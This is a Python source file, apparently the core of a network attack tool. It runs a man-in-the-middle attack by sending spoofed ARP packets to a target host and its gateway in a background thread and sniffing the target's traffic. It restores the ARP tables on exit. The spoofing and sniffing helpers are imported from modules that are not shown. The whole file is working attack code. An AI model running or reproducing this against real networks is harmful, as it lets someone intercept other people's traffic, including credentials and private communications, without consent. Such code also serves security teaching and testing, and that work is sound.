import threading
import time
from ..modules import arp_spoofer
from ..modules import sniffer
from ..utils.network import get_mac # Correctly import get_mac from your utils

def _arp_spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    The background thread function for continuously sending spoofed ARP packets.
    It now accepts the MAC addresses to be more efficient.
    """
    print("[CORE] ARP spoof thread started.")
    try:
        while True:
            # Use the pre-fetched MAC addresses for efficiency
            arp_spoofer.send_spoof_packet(target_ip, gateway_ip, target_mac)
            arp_spoofer.send_spoof_packet(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        print(f"[ERROR in spoof thread] {e}")

def start_mitm_attack(target_ip, gateway_ip, interface):
    """
    Main orchestrator for the full MitM attack.
    """
    print("[CORE] Initializing Man-in-the-Middle attack...")
    
    try:
        # Look up MAC addresses once at the beginning
        print("[CORE] Resolving MAC addresses...")
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        print(f"Target; MAC:{target_mac} IP: {target_ip}")
        print(f"Router; MAC:{gateway_mac} IP: {gateway_ip}")

        if not target_mac or not gateway_mac:
            print("[ERROR] Could not resolve one or more MAC addresses. Aborting.")
            return
        
        print(f"[+] Target MAC: {target_mac}")
        print(f"[+] Gateway MAC: {gateway_mac}")

        # Start the spoofing loop in a background thread
        # Pass the resolved MACs as arguments to the thread's target function
        spoof_thread = threading.Thread(
            target=_arp_spoof_loop,
            args=(target_ip, gateway_ip, target_mac, gateway_mac),
            daemon=True
        )
        spoof_thread.start()

        # Start the sniffer in the main thread to capture traffic
        print("[CORE] Starting packet sniffer. Press Ctrl+C to stop.")
        filter_string = f"ip host {target_ip}"
        sniffer.start_sniffing(interface, filter_str=filter_string)

    except KeyboardInterrupt:
        # This message is shown when the user presses Ctrl+C
        print("\n[CORE] Ctrl+C detected. Restoring network and shutting down.")
    finally:
        # This block is guarenteed to run on exit
        print("[CORE] Restoring ARP tables...")
        # Make sure 'target_mac' and 'gateway_mac' were resolved before trying to restore
        if 'target_mac' in locals() and 'gateway_mac' in locals() and target_mac and gateway_mac:
             arp_spoofer.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)
             arp_spoofer.restore_network(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[CORE] Network restored. Exiting.")